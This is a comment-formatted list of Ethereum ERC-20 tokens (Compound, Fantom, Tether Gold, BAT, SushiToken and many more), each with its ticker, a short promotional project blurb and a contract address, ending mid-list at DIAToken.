// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5

// Fantom Token (FTM)
// Fantom is a high-performance, scalable, customizable, and secure smart-contract platform. It is designed to overcome the limitations of previous generation blockchain platforms. Fantom is permissionless, decentralized, and open-source.
// 0x4e15361fd6b4bb609fa63c81a2be19d873717870

// Tether Gold (XAUt)
// Each XAU₮ token represents ownership of one troy fine ounce of physical gold on a specific gold bar. Furthermore, Tether Gold (XAU₮) is the only product among the competition that offers zero custody fees and has direct control over the physical gold storage.
// 0x68749665ff8d2d112fa859aa293f07a622782f38

// BitDAO (BIT)
// 0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5

// chiliZ (CHZ)
// Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
// 0x3506424f91fd33084466f402d5d97f05f8e3b4af

// BAT (BAT)
// The Basic Attention Token is the new token for the digital advertising industry.
// 0x0d8775f648430679a709e98d2b0cb6250d2887ef

// LoopringCoin V2 (LRC)
// Loopring is a DEX protocol offering orderbook-based trading infrastructure, zero-knowledge proof and an auction protocol called Oedax (Open-Ended Dutch Auction Exchange).
// 0xbbbbca6a901c926f240b89eacb641d8aec7aeafd

// Fei USD (FEI)
// Fei Protocol ($FEI) represents a direct incentive stablecoin which is undercollateralized and fully decentralized. FEI employs a stability mechanism known as direct incentives - dynamic mint rewards and burn penalties on DEX trade volume to maintain the peg.
// 0x956F47F50A910163D8BF957Cf5846D573E7f87CA

// Zilliqa (ZIL)
// Zilliqa is a high-throughput public blockchain platform - designed to scale to thousands ​of transactions per second.
// 0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27

// Amp (AMP)
// Amp is a digital collateral token designed to facilitate fast and efficient value transfer, especially for use cases that prioritize security and irreversibility. Using Amp as collateral, individuals and entities benefit from instant, verifiable assurances for any kind of asset exchange.
// 0xff20817765cb7f73d4bde2e66e067e58d11095c2

// Gala (GALA)
// Gala Games is dedicated to decentralizing the multi-billion dollar gaming industry by giving players access to their in-game items. Coming from the Co-founder of Zynga and some of the creative minds behind Farmville 2, Gala Games aims to revolutionize gaming.
// 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA

// EnjinCoin (ENJ)
// Customizable cryptocurrency and virtual goods platform for gaming.
// 0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c

// XinFin XDCE (XDCE)
// Hybrid Blockchain technology company focused on international trade and finance.
// 0x41ab1b6fcbb2fa9dced81acbdec13ea6315f2bf2

// Wrapped Celo (wCELO)
// Wrapped Celo is a 1:1 equivalent of Celo. Celo is a utility and governance asset for the Celo community, which has a fixed supply and variable value. With Celo, you can help shape the direction of the Celo Platform.
// 0xe452e6ea2ddeb012e20db73bf5d3863a3ac8d77a

// HoloToken (HOT)
// Holo is a decentralized hosting platform based on Holochain, designed to be a scalable development framework for distributed applications.
// 0x6c6ee5e31d828de241282b9606c8e98ea48526e2

// Synthetix Network Token (SNX)
// The Synthetix Network Token (SNX) is the native token of Synthetix, a synthetic asset (Synth) issuance protocol built on Ethereum. The SNX token is used as collateral to issue Synths, ERC-20 tokens that track the price of assets like Gold, Silver, Oil and Bitcoin.
// 0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f

// Nexo (NEXO)
// Instant Crypto-backed Loans
// 0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206

// HarmonyOne (ONE)
// A project to scale trust for billions of people and create a radically fair economy.
// 0x799a4202c12ca952cb311598a024c80ed371a41e

// 1INCH Token (1INCH)
// 1inch is a decentralized exchange aggregator that sources liquidity from various exchanges and is capable of splitting a single trade transaction across multiple DEXs. Smart contract technology empowers this aggregator enabling users to optimize and customize their trades.
// 0x111111111117dc0aa78b770fa6a738034120c302

// pTokens SAFEMOON (pSAFEMOON)
// Safemoon protocol aims to create a self-regenerating automatic liquidity providing protocol that would pay out static rewards to holders and penalize sellers.
// 0x16631e53c20fd2670027c6d53efe2642929b285c

// Frax Share (FXS)
// FXS is the value accrual and governance token of the entire Frax ecosystem. Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC.
// 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0

// Serum (SRM)
// Serum is a decentralized derivatives exchange with trustless cross-chain trading by Project Serum, in collaboration with a consortium of crypto trading and DeFi experts.
// 0x476c5E26a75bd202a9683ffD34359C0CC15be0fF

// WQtum (WQTUM)
// 0x3103df8f05c4d8af16fd22ae63e406b97fec6938

// Olympus (OHM)
// 0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5

// Gnosis (GNO)
// Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
// 0x6810e776880c02933d47db1b9fc05908e5386b96

// MCO (MCO)
// Crypto.com, the pioneering payments and cryptocurrency platform, seeks to accelerate the world’s transition to cryptocurrency.
// 0xb63b606ac810a52cca15e44bb630fd42d8d1d83d

// Gemini dollar (GUSD)
// Gemini dollar combines the creditworthiness and price stability of the U.S. dollar with blockchain technology and the oversight of U.S. regulators.
// 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd

// OMG Network (OMG)
// OmiseGO (OMG) is a public Ethereum-based financial technology for use in mainstream digital wallets
// 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07

// IOSToken (IOST)
// A Secure & Scalable Blockchain for Smart Services
// 0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab

// IoTeX Network (IOTX)
// IoTeX is the next generation of the IoT-oriented blockchain platform with vast scalability, privacy, isolatability, and developability. IoTeX connects the physical world, block by block.
// 0x6fb3e0a217407efff7ca062d46c26e5d60a14d69

// NXM (NXM)
// Nexus Mutual uses the power of Ethereum so people can share risks together without the need for an insurance company.
// 0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b

// ZRX (ZRX)
// 0x is an open, permissionless protocol allowing for tokens to be traded on the Ethereum blockchain.
// 0xe41d2489571d322189246dafa5ebde1f4699f498

// Celsius (CEL)
// A new way to earn, borrow, and pay on the blockchain.!
// 0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d

// Magic Internet Money (MIM)
// abracadabra.money is a lending protocol that allows users to borrow a USD-pegged Stablecoin (MIM) using interest-bearing tokens as collateral.
// 0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3

// Golem Network Token (GLM)
// Golem is going to create the first decentralized global market for computing power
// 0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429

// Compound (COMP)
// Compound governance token
// 0xc00e94cb662c3520282e6f5717214004a7f26888

// Lido DAO Token (LDO)
// Lido is a liquid staking solution for Ethereum. Lido lets users stake their ETH - with no minimum deposits or maintaining of infrastructure - whilst participating in on-chain activities, e.g. lending, to compound returns. LDO is an ERC20 token granting governance rights in the Lido DAO.
// 0x5a98fcbea516cf06857215779fd812ca3bef1b32

// HUSD (HUSD)
// HUSD is an ERC-20 token that is 1:1 ratio pegged with USD. It was issued by Stable Universal, an entity that follows US regulations.
// 0xdf574c24545e5ffecb9a659c229253d4111d87e1

// SushiToken (SUSHI)
// Be a DeFi Chef with Sushi - Swap, earn, stack yields, lend, borrow, leverage all on one decentralized, community driven platform.
// 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2

// Livepeer Token (LPT)
// A decentralized video streaming protocol that empowers developers to build video enabled applications backed by a competitive market of economically incentivized service providers.
// 0x58b6a8a3302369daec383334672404ee733ab239

// WAX Token (WAX)
// Global Decentralized Marketplace for Virtual Assets.
// 0x39bb259f66e1c59d5abef88375979b4d20d98022

// Swipe (SXP)
// Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
// 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9

// Ethereum Name Service (ENS)
// Decentralised naming for wallets, websites, & more.
// 0xc18360217d8f7ab5e7c516566761ea12ce7f9d72

// APENFT (NFT)
// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
// 0x198d14f2ad9ce69e76ea330b374de4957c3f850a

// UMA Voting Token v1 (UMA)
// UMA is a decentralized financial contracts platform built to enable Universal Market Access.
// 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828

// MXCToken (MXC)
// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
// 0x5ca381bbfb58f0092df149bd3d243b08b9a8386e

// SwissBorg (CHSB)
// Crypto Wealth Management.
// 0xba9d4199fab4f26efe3551d490e3821486f135ba

// Polymath (POLY)
// Polymath aims to enable securities to migrate to the blockchain.
// 0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec

// Wootrade Network (WOO)
// Wootrade is incubated by Kronos Research, which aims to solve the pain points of the diversified liquidity of the cryptocurrency market, and provides sufficient trading depth for users such as exchanges, wallets, and trading institutions with zero fees.
// 0x4691937a7508860f876c9c0a2a617e7d9e945d4b

// Dogelon (ELON)
// A universal currency for the people.
// 0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3

// yearn.finance (YFI)
// DeFi made simple.
// 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e

// PlatonCoin (PLTC)
// Platon Finance is a blockchain digital ecosystem that represents a bridge for all the people and business owners so everybody could learn, understand, use and benefit from blockchain, a revolution of technology. See the future in a new light with Platon.
// 0x429D83Bb0DCB8cdd5311e34680ADC8B12070a07f

// OriginToken (OGN)
// Origin Protocol is a platform for creating decentralized marketplaces on the blockchain.
// 0x8207c1ffc5b6804f6024322ccf34f29c3541ae26


// STASIS EURS Token (EURS)
// EURS token is a virtual financial asset that is designed to digitally mirror the EURO on the condition that its value is tied to the value of its collateral.
// 0xdb25f211ab05b1c97d595516f45794528a807ad8

// Smooth Love Potion (SLP)
// Smooth Love Potions (SLP) is a ERC-20 token that is fully tradable.
// 0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

// Balancer (BAL)
// Balancer is a n-dimensional automated market-maker that allows anyone to create or add liquidity to customizable pools and earn trading fees. Instead of the traditional constant product AMM model, Balancer’s formula is a generalization that allows any number of tokens in any weights or trading fees.
// 0xba100000625a3754423978a60c9317c58a424e3d

// renBTC (renBTC)
// renBTC is a one for one representation of BTC on Ethereum via RenVM.
// 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d

// Bancor (BNT)
// Bancor is an on-chain liquidity protocol that enables constant convertibility between tokens. Conversions using Bancor are executed against on-chain liquidity pools using automated market makers to price and process transactions without order books or counterparties.
// 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c

// Revain (REV)
// Revain is a blockchain-based review platform for the crypto community. Revain's ultimate goal is to provide high-quality reviews on all global products and services using emerging technologies like blockchain and AI.
// 0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9

// Rocket Pool (RPL)
// 0xd33526068d116ce69f19a9ee46f0bd304f21a51f

// Rocket Pool (RPL)
// Token contract has migrated to 0xD33526068D116cE69F19A9ee46F0bd304F21A51f
// 0xb4efd85c19999d84251304bda99e90b92300bd93

// Kyber Network Crystal v2 (KNC)
// Kyber is a blockchain-based liquidity protocol that aggregates liquidity from a wide range of reserves, powering instant and secure token exchange in any decentralized application.
// 0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202

// Iron Bank EUR (ibEUR)
// Fixed Forex is the collective name for USD, EUR, ZAR, JPY, CNY, AUD, AED, CAD, INR, and any other forex pairs launched under the Fixed Forex moniker.
// 0x96e61422b6a9ba0e068b6c5add4ffabc6a4aae27

// Synapse (SYN)
// Synapse is a cross-chain layer ∞ protocol powering interoperability between blockchains.
// 0x0f2d719407fdbeff09d87557abb7232601fd9f29

// XSGD (XSGD)
// StraitsX is the pioneering payments infrastructure for the digital assets space in Southeast Asia developed by Singapore-based FinTech Xfers Pte. Ltd, a Major Payment Institution licensed by the Monetary Authority of Singapore for e-money issuance
// 0x70e8de73ce538da2beed35d14187f6959a8eca96

// dYdX (DYDX)
// DYDX is a governance token that allows the dYdX community to truly govern the dYdX Layer 2 Protocol. By enabling shared control of the protocol, DYDX allows traders, liquidity providers, and partners of dYdX to work collectively towards an enhanced Protocol.
// 0x92d6c1e31e14520e676a687f0a93788b716beff5

// Reserve Rights (RSR)
// The fluctuating protocol token that plays a role in stabilizing RSV and confers the cryptographic right to purchase excess Reserve tokens as the network grows.
// 0x320623b8e4ff03373931769a31fc52a4e78b5d70

// Illuvium (ILV)
// Illuvium is a decentralized, NFT collection and auto battler game built on the Ethereum network.
// 0x767fe9edc9e0df98e07454847909b5e959d7ca0e

// CEEK (CEEK)
// Universal Currency for VR & Entertainment Industry. Working Product Partnered with NBA Teams, Universal Music and Apple
// 0xb056c38f6b7dc4064367403e26424cd2c60655e1

// Chroma (CHR)
// Chromia is a relational blockchain designed to make it much easier to make complex and scalable dapps.
// 0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2

// Telcoin (TEL)
// A cryptocurrency distributed by your mobile operator and accepted everywhere.
// 0x467Bccd9d29f223BcE8043b84E8C8B282827790F

// KEEP Token (KEEP)
// A keep is an off-chain container for private data.
// 0x85eee30c52b0b379b046fb0f85f4f3dc3009afec

// Pundi X Token (PUNDIX)
// To provide developers increased use cases and token user base by supporting offline and online payment of their custom tokens in Pundi X‘s ecosystem.
// 0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38

// PowerLedger (POWR)
// Power Ledger is a peer-to-peer marketplace for renewable energy.
// 0x595832f8fc6bf59c85c527fec3740a1b7a361269

// Render Token (RNDR)
// RNDR (Render Network) bridges GPUs across the world in order to provide much-needed power to artists, studios, and developers who rely on high-quality rendering to power their creations. The mission is to bridge the gap between GPU supply/demand through the use of distributed GPU computing.
// 0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24

// Storj (STORJ)
// Blockchain-based, end-to-end encrypted, distributed object storage, where only you have access to your data
// 0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac

// Synth sUSD (sUSD)
// A synthetic asset issued by the Synthetix protocol which tracks the price of the United States Dollar (USD). sUSD can be traded on Synthetix.Exchange for other synthetic assets through a peer-to-contract system with no slippage.
// 0x57ab1ec28d129707052df4df418d58a2d46d5f51

// BitMax token (BTMX)
// Digital asset trading platform
// 0xcca0c9c383076649604eE31b20248BC04FdF61cA

// DENT (DENT)
// Aims to disrupt the mobile operator industry by creating an open marketplace for buying and selling of mobile data.
// 0x3597bfd533a99c9aa083587b074434e61eb0a258

// FunFair (FUN)
// FunFair is a decentralised gaming platform powered by Ethereum smart contracts
// 0x419d0d8bdd9af5e606ae2232ed285aff190e711b

// XY Oracle (XYO)
// Blockchain's crypto-location oracle network
// 0x55296f69f40ea6d20e478533c15a6b08b654e758

// Metal (MTL)
// Transfer money instantly around the globe with nothing more than a phone number. Earn rewards every time you spend or make a purchase. Ditch the bank and go digital.
// 0xF433089366899D83a9f26A773D59ec7eCF30355e

// CelerToken (CELR)
// Celer Network is a layer-2 scaling platform that enables fast, easy and secure off-chain transactions.
// 0x4f9254c83eb525f9fcf346490bbb3ed28a81c667

// Ocean Token (OCEAN)
// Ocean Protocol helps developers build Web3 apps to publish, exchange and consume data.
// 0x967da4048cD07aB37855c090aAF366e4ce1b9F48

// Divi Exchange Token (DIVX)
// Digital Currency
// 0x13f11c9905a08ca76e3e853be63d4f0944326c72

// Tribe (TRIBE)
// 0xc7283b66eb1eb5fb86327f08e1b5816b0720212b

// ZEON (ZEON)
// ZEON Wallet provides a secure application that available for all major OS. Crypto-backed loans without checks.
// 0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532

// Rari Governance Token (RGT)
// The Rari Governance Token is the native token behind the DeFi robo-advisor, Rari Capital.
// 0xD291E7a03283640FDc51b121aC401383A46cC623

// Injective Token (INJ)
// Access, create and trade unlimited decentralized finance markets on an Ethereum-compatible exchange protocol for cross-chain DeFi.
// 0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30

// Energy Web Token Bridged (EWTB)
// Energy Web Token (EWT) is the native token of the Energy Web Chain, a public, Proof-of-Authority Ethereum Virtual Machine blockchain specifically designed to support enterprise-grade applications in the energy sector.
// 0x178c820f862b14f316509ec36b13123da19a6054

// MEDX TOKEN (MEDX)
// Decentralized healthcare information system
// 0xfd1e80508f243e64ce234ea88a5fd2827c71d4b7

// Spell Token (SPELL)
// Abracadabra.money is a lending platform that allows users to borrow funds using Interest Bearing Tokens as collateral.
// 0x090185f2135308bad17527004364ebcc2d37e5f6

// Uquid Coin (UQC)
// The goal of this blockchain asset is to supplement the development of UQUID Ecosystem. In this virtual revolution, coin holders will have the benefit of instantly and effortlessly cash out their coins.
// 0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2

// Mask Network (MASK)
// Mask Network allows users to encrypt content when posting on You-Know-Where and only the users and their friends can decrypt them.
// 0x69af81e73a73b40adf4f3d4223cd9b1ece623074

// Function X (FX)
// Function X is an ecosystem built entirely on and for the blockchain. It consists of five elements: f(x) OS, f(x) public blockchain, f(x) FXTP, f(x) docker and f(x) IPFS.
// 0x8c15ef5b4b21951d50e53e4fbda8298ffad25057

// Aragon Network Token (ANT)
// Create and manage unstoppable organizations. Aragon lets you manage entire organizations using the blockchain. This makes Aragon organizations more efficient than their traditional counterparties.
// 0xa117000000f279d81a1d3cc75430faa017fa5a2e

// KyberNetwork (KNC)
// KyberNetwork is a new system which allows the exchange and conversion of digital assets.
// 0xdd974d5c2e2928dea5f71b9825b8b646686bd200

// Origin Dollar (OUSD)
// Origin Dollar (OUSD) is a stablecoin that earns yield while it's still in your wallet. It was created by the team at Origin Protocol (OGN).
// 0x2a8e1e676ec238d8a992307b495b45b3feaa5e86

// QuarkChain Token (QKC)
// A High-Capacity Peer-to-Peer Transactional System
// 0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664

// Anyswap (ANY)
// Anyswap is a mpc decentralized cross-chain swap protocol.
// 0xf99d58e463a2e07e5692127302c20a191861b4d6

// Trace (TRAC)
// Purpose-built Protocol for Supply Chains Based on Blockchain.
// 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f

// ELF (ELF)
// elf is a decentralized self-evolving cloud computing blockchain network that aims to provide a high performance platform for commercial adoption of blockchain.
// 0xbf2179859fc6d5bee9bf9158632dc51678a4100e

// Request (REQ)
// A decentralized network built on top of Ethereum, which allows anyone, anywhere to request a payment.
// 0x8f8221afbb33998d8584a2b05749ba73c37a938a

// STPT (STPT)
// Decentralized Network for the Tokenization of any Asset.
// 0xde7d85157d9714eadf595045cc12ca4a5f3e2adb

// Ribbon (RBN)
// Ribbon uses financial engineering to create structured products that aim to deliver sustainable yield. Ribbon's first product focuses on yield through automated options strategies. The protocol also allows developers to create arbitrary structured products by combining various DeFi derivatives.
// 0x6123b0049f904d730db3c36a31167d9d4121fa6b

// HooToken (HOO)
// HooToken aims to provide safe and reliable assets management and blockchain services to users worldwide.
// 0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d

// Wrapped Celo USD (wCUSD)
// Wrapped Celo Dollars are a 1:1 equivalent of Celo Dollars. cUSD (Celo Dollars) is a stable asset that follows the US Dollar.
// 0xad3e3fc59dff318beceaab7d00eb4f68b1ecf195

// Dawn (DAWN)
// Dawn is a utility token to reward competitive gaming and help players to build their professional Esports careers.
// 0x580c8520deda0a441522aeae0f9f7a5f29629afa

// StormX (STMX)
// StormX is a gamified marketplace that enables users to earn STMX ERC-20 tokens by completing micro-tasks or shopping at global partner stores online. Users can earn staking rewards, shopping, and micro-task benefits for holding STMX in their own wallet.
// 0xbe9375c6a420d2eeb258962efb95551a5b722803

// BandToken (BAND)
// A data governance framework for Web3.0 applications operating as an open-source standard for the decentralized management of data. Band Protocol connects smart contracts with trusted off-chain information, provided through community-curated oracle data providers.
// 0xba11d00c5f74255f56a5e366f4f77f5a186d7f55

// NKN (NKN)
// NKN is the new kind of P2P network connectivity protocol & ecosystem powered by a novel public blockchain.
// 0x5cf04716ba20127f1e2297addcf4b5035000c9eb

// Reputation (REPv2)
// Augur combines the magic of prediction markets with the power of a decentralized network to create a stunningly accurate forecasting tool
// 0x221657776846890989a759ba2973e427dff5c9bb

// Alchemy (ACH)
// Alchemy Pay (ACH) is a Singapore-based payment solutions provider that provides online and offline merchants with secure, convenient fiat and crypto acceptance.
// 0xed04915c23f00a313a544955524eb7dbd823143d

// Orchid (OXT)
// Orchid enables a decentralized VPN.
// 0x4575f41308EC1483f3d399aa9a2826d74Da13Deb

// Fetch (FET)
// Fetch.ai is building tools and infrastructure to enable a decentralized digital economy by combining AI, multi-agent systems and advanced cryptography.
// 0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85

// Propy (PRO)
// Property Transactions Secured Through Blockchain.
// 0x226bb599a12c826476e3a771454697ea52e9e220

// Adshares (ADS)
// Adshares is a Web3 protocol for monetization space in the Metaverse. Adserver platforms allow users to rent space inside Metaverse, blockchain games, NFT exhibitions and websites.
// 0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a

// FLOKI (FLOKI)
// The Floki Inu protocol is a cross-chain community-driven token available on two blockchains: Ethereum (ETH) and Binance Smart Chain (BSC).
// 0xcf0c122c6b73ff809c693db761e7baebe62b6a2e

// Aurora (AURORA)
// Aurora is an EVM built on the NEAR Protocol, a solution for developers to operate their apps on an Ethereum-compatible, high-throughput, scalable and future-safe platform, with a fully trustless bridge architecture to connect Ethereum with other networks.
// 0xaaaaaa20d9e0e2461697782ef11675f668207961

// Token Prometeus Network (PROM)
// Prometeus Network fuels people-owned data markets, introducing new ways to interact with data and profit from it. They use a peer-to-peer approach to operate beyond any border or jurisdiction.
// 0xfc82bb4ba86045af6f327323a46e80412b91b27d

// Ankr Eth2 Reward Bearing Certificate (aETHc)
// Ankr's Eth2 staking solution provides the best user experience and highest level of safety, combined with an attractive reward mechanism and instant staking liquidity through a bond-like synthetic token called aETH.
// 0xE95A203B1a91a908F9B9CE46459d101078c2c3cb

// Numeraire (NMR)
// NMR is the scarcity token at the core of the Erasure Protocol. NMR cannot be minted and its core use is for staking and burning. The Erasure Protocol brings negative incentives to any website on the internet by providing users with economic skin in the game and punishing bad actors.
// 0x1776e1f26f98b1a5df9cd347953a26dd3cb46671

// RLC (RLC)
// Blockchain Based distributed cloud computing
// 0x607F4C5BB672230e8672085532f7e901544a7375

// Compound Basic Attention Token (cBAT)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e

// Bifrost (BFC)
// Bifrost is a multichain middleware platform that enables developers to create Decentralized Applications (DApps) on top of multiple protocols.
// 0x0c7D5ae016f806603CB1782bEa29AC69471CAb9c

// Boba Token (BOBA)
// Boba is an Ethereum L2 optimistic rollup that reduces gas fees, improves transaction throughput, and extends the capabilities of smart contracts through Hybrid Compute. Users of Boba’s native fast bridge can withdraw their funds in a few minutes instead of the usual 7 days required by other ORs.
// 0x42bbfa2e77757c645eeaad1655e0911a7553efbc

// AlphaToken (ALPHA)
// Alpha Finance Lab is an ecosystem of DeFi products and focused on building an ecosystem of automated yield-maximizing Alpha products that interoperate to bring optimal alpha to users on a cross-chain level.
// 0xa1faa113cbe53436df28ff0aee54275c13b40975

// SingularityNET Token (AGIX)
// Decentralized marketplace for artificial intelligence.
// 0x5b7533812759b45c2b44c19e320ba2cd2681b542

// Dusk Network (DUSK)
// Dusk streamlines the issuance of digital securities and automates trading compliance with the programmable and confidential securities.
// 0x940a2db1b7008b6c776d4faaca729d6d4a4aa551

// CocosToken (COCOS)
// The platform for the next generation of digital game economy.
// 0x0c6f5f7d555e7518f6841a79436bd2b1eef03381

// Beta Token (BETA)
// Beta Finance is a cross-chain permissionless money market protocol for lending, borrowing, and shorting crypto. Beta Finance has created an integrated “1-Click” Short Tool to initiate, manage, and close short positions, as well as allow anyone to create money markets for a token automatically.
// 0xbe1a001fe942f96eea22ba08783140b9dcc09d28

// USDK (USDK)
// USDK-Stablecoin Powered by Blockchain and US Licenced Trust Company
// 0x1c48f86ae57291f7686349f12601910bd8d470bb

// Veritaseum (VERI)
// Veritaseum builds blockchain-based, peer-to-peer capital markets as software on a global scale.
// 0x8f3470A7388c05eE4e7AF3d01D8C722b0FF52374

// mStable USD (mUSD)
// The mStable Standard is a protocol with the goal of making stablecoins and other tokenized assets easy, robust, and profitable.
// 0xe2f2a5c287993345a840db3b0845fbc70f5935a5

// Marlin POND (POND)
// Marlin is an open protocol that provides a high-performance programmable network infrastructure for Web 3.0
// 0x57b946008913b82e4df85f501cbaed910e58d26c

// Automata (ATA)
// Automata is a privacy middleware layer for dApps across multiple blockchains, built on a decentralized service protocol.
// 0xa2120b9e674d3fc3875f415a7df52e382f141225

// TrueFi (TRU)
// TrueFi is a DeFi protocol for uncollateralized lending powered by the TRU token. TRU Stakers to assess the creditworthiness of the loans
// 0x4c19596f5aaff459fa38b0f7ed92f11ae6543784

// Rupiah Token (IDRT)
// Rupiah Token (IDRT) is the first fiat-collateralized Indonesian Rupiah Stablecoin. Developed by PT Rupiah Token Indonesia, each IDRT is worth exactly 1 IDR.
// 0x998FFE1E43fAcffb941dc337dD0468d52bA5b48A

// Aergo (AERGO)
// Aergo is an open platform that allows businesses to build innovative applications and services by sharing data on a trustless and distributed IT ecosystem.
// 0x91Af0fBB28ABA7E31403Cb457106Ce79397FD4E6

// DODO bird (DODO)
// DODO is a on-chain liquidity provider, which leverages the Proactive Market Maker algorithm (PMM) to provide pure on-chain and contract-fillable liquidity for everyone.
// 0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd

// Keep3rV1 (KP3R)
// Keep3r Network is a decentralized keeper network for projects that need external devops and for external teams to find keeper jobs.
// 0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44

// ALICE (ALICE)
// My Neighbor Alice is a multiplayer builder game, where anyone can buy and own virtual islands, collect and build items and meet new friends.
// 0xac51066d7bec65dc4589368da368b212745d63e8

// Litentry (LIT)
// Litentry is a Decentralized Identity Aggregator that enables linking user identities across multiple networks.
// 0xb59490ab09a0f526cc7305822ac65f2ab12f9723

// Covalent Query Token (CQT)
// Covalent aggregates information from across dozens of sources including nodes, chains, and data feeds. Covalent returns this data in a rapid and consistent manner, incorporating all relevant data within one API interface.
// 0xd417144312dbf50465b1c641d016962017ef6240

// BitMartToken (BMC)
// BitMart is a globally integrated trading platform founded by a group of cryptocurrency enthusiasts.
// 0x986EE2B944c42D017F52Af21c4c69B84DBeA35d8

// Proton (XPR)
// Proton is a new public blockchain and dApp platform designed for both consumer applications and P2P payments. It is built around a secure identity and financial settlements layer that allows users to directly link real identity and fiat accounts, pull funds and buy crypto, and use crypto seamlessly.
// 0xD7EFB00d12C2c13131FD319336Fdf952525dA2af

// Aurora DAO (AURA)
// Aurora is a collection of Ethereum applications and protocols that together form a decentralized banking and finance platform.
// 0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814

// CarryToken (CRE)
// Carry makes personal data fair for consumers, marketers and merchants
// 0x115ec79f1de567ec68b7ae7eda501b406626478e

// LCX (LCX)
// LCX Terminal is made for Professional Cryptocurrency Portfolio Management
// 0x037a54aab062628c9bbae1fdb1583c195585fe41

// Gitcoin (GTC)
// GTC is a governance token with no economic value. GTC governs Gitcoin, where they work to decentralize grants, manage disputes, and govern the treasury.
// 0xde30da39c46104798bb5aa3fe8b9e0e1f348163f

// BOX Token (BOX)
// BOX offers a secure, convenient and streamlined crypto asset management system for institutional investment, audit risk control and crypto-exchange platforms.
// 0xe1A178B681BD05964d3e3Ed33AE731577d9d96dD

// Mainframe Token (MFT)
// The Hifi Lending Protocol allows users to borrow against their crypto. Hifi uses a bond-like instrument, representing an on-chain obligation that settles on a specific future date. Buying and selling the tokenized debt enables fixed-rate lending and borrowing.
// 0xdf2c7238198ad8b389666574f2d8bc411a4b7428

// UniBright (UBT)
// The unified framework for blockchain based business integration
// 0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e

// QASH (QASH)
// We envision QASH to be the preferred payment token for financial services, like the Bitcoin for financial services. As more financial institutions, fintech startups and partners adopt QASH as a method of payment, the utility of QASH will scale, fueling the Fintech revolution.
// 0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6

// AIOZ Network (AIOZ)
// The AIOZ Network is a decentralized content delivery network, which relies on multiple nodes spread out throughout the globe. These nodes provide computational-demanding resources like bandwidth, storage, and computational power in order to store content, share content and perform computing tasks.
// 0x626e8036deb333b408be468f951bdb42433cbf18

// Bluzelle (BLZ)
// Aims to be the next-gen database protocol for the decentralized internet.
// 0x5732046a883704404f284ce41ffadd5b007fd668

// Reserve (RSV)
// Reserve aims to create a stable decentralized currency targeted at emerging economies.
// 0x196f4727526eA7FB1e17b2071B3d8eAA38486988

// Presearch (PRE)
// Presearch is building a decentralized search engine powered by the community. Presearch utilizes its PRE cryptocurrency token to reward users for searching and to power its Keyword Staking ad platform.
// 0xEC213F83defB583af3A000B1c0ada660b1902A0F

// TORN Token (TORN)
// Tornado Cash is a fully decentralized protocol for private transactions on Ethereum.
// 0x77777feddddffc19ff86db637967013e6c6a116c

// Student Coin (STC)
// The idea of the project is to create a worldwide academically-focused cryptocurrency, supervised by university and research faculty, established by students for students. Student Coins are used to build a multi-university ecosystem of value transfer.
// 0x15b543e986b8c34074dfc9901136d9355a537e7e

// Melon Token (MLN)
// Enzyme is a way to build, scale, and monetize investment strategies
// 0xec67005c4e498ec7f55e092bd1d35cbc47c91892

// HOPR Token (HOPR)
// HOPR provides essential and compliant network-level metadata privacy for everyone. HOPR is an open incentivized mixnet which enables privacy-preserving point-to-point data exchange.
// 0xf5581dfefd8fb0e4aec526be659cfab1f8c781da

// DIAToken (DIA)
